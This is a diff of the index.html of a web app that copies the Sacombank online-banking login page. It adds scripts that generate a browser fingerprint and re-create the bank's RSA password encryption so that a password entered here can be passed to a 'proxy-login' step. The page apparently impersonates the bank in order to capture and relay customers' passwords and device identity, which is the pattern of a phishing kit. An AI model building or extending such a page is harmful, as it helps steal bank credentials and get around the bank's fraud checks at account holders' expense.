@@ -1,14 +1,96 @@
 <!doctype html>
 <html lang="vi">
-  <head>
-    <meta charset="UTF-8" />
-    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="description" content="Đăng nhập iSacombank - Ngân hàng điện tử Sacombank" />
-    <title>iSACOMBANK - Đăng nhập</title>
-  </head>
-  <body>
-    <div id="root"></div>
-    <script type="module" src="/src/main.jsx"></script>
-  </body>
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Đăng nhập iSacombank - Ngân hàng điện tử Sacombank" />
+  <title>iSACOMBANK - Đăng nhập</title>
+</head>
+
+<body>
+  <div id="root"></div>
+
+  <!--
+    ═══════════════════════════════════════════════════════
+    THƯ VIỆN CRYPTO & FINGERPRINT CỦA SACOMBANK
+    ═══════════════════════════════════════════════════════
+    Thứ tự load quan trọng:
+    1. forge.min.js   — thư viện Node Forge RSA (dùng để mã hoá password)
+    2. fingerprint.js — thu thập browser fingerprint (Fingerprint class)
+    ═══════════════════════════════════════════════════════
+  -->
+  <script src="/js/forge.min.js"></script>
+  <script src="/js/fingerprint.js"></script>
+
+  <!--
+    Helper toàn cục: getDeviceDNA()
+    Sinh ra chuỗi fingerprint của trình duyệt bằng thư viện Fingerprint đã load ở trên.
+    Được gọi từ LoginStep2.jsx trước khi submit proxy-login.
+  -->
+  <script>
+    /**
+     * Sinh chuỗi Device Fingerprint (DNA) bằng library fingerprint.js.
+     * Trả về chuỗi số nguyên (murmurhash3 của các thông số trình duyệt).
+     * @returns {string}
+     */
+    window.getDeviceDNA = function () {
+      try {
+        var fp = new Fingerprint({ canvas: true });
+        return String(fp.get());
+      } catch (e) {
+        console.warn('[DeviceDNA] Fingerprint generation failed:', e);
+        return String(Date.now()); // fallback
+      }
+    };
+
+    /**
+     * Mã hoá mật khẩu bằng RSA sử dụng node-forge.
+     * encryptKey format (từ Sacombank): "hexExponent,hexModulus,maxDigits"
+     *
+     * Sacombank dùng jCryption với format:
+     *   plaintext = "password=" + rawPassword + "_SALT_COMPONENT_=" + Math.random()
+     *   → RSA encrypt bằng public key (e, n) từ __JS_ENCRYPT_KEY__
+     *
+     * @param {string} rawPassword - Mật khẩu gốc người dùng nhập
+     * @param {string} encryptKey  - Giá trị __JS_ENCRYPT_KEY__ từ Sacombank (hex e,hex n,maxDigits)
+     * @returns {string} - Chuỗi hex của ciphertext (theo jCryption convention)
+     */
+    window.encryptPasswordSacombank = function (rawPassword, encryptKey) {
+      try {
+        var parts = encryptKey.split(',');
+        if (parts.length < 2) {
+          throw new Error('encryptKey không hợp lệ: ' + encryptKey);
+        }
+
+        var hexE = parts[0].trim();          // encryption exponent (hex)
+        var hexN = parts[1].trim();          // modulus (hex)
+        // parts[2] là maxDigits (không cần dùng với forge)
+
+        // Build plaintext theo đúng format của jCryption
+        var plaintext = 'password=' + rawPassword + '_SALT_COMPONENT_=' + Math.random();
+
+        // Tạo RSA public key bằng node-forge từ hex e và hex n
+        var n = new forge.jsbn.BigInteger(hexN, 16);
+        var e = new forge.jsbn.BigInteger(hexE, 16);
+        var publicKey = forge.pki.rsa.setPublicKey(n, e);
+
+        // Mã hoá bằng PKCS#1 v1.5 (jCryption dùng PKCS1)
+        var encrypted = publicKey.encrypt(plaintext, 'RSAES-PKCS1-V1_5');
+
+        // Convert bytes sang hex string (jCryption trả về hex)
+        var hexResult = forge.util.bytesToHex(encrypted);
+        return hexResult;
+
+      } catch (err) {
+        console.error('[encryptPasswordSacombank] Error:', err);
+        throw err;
+      }
+    };
+  </script>
+
+  <script type="module" src="/src/main.jsx"></script>
+</body>
+
 </html>
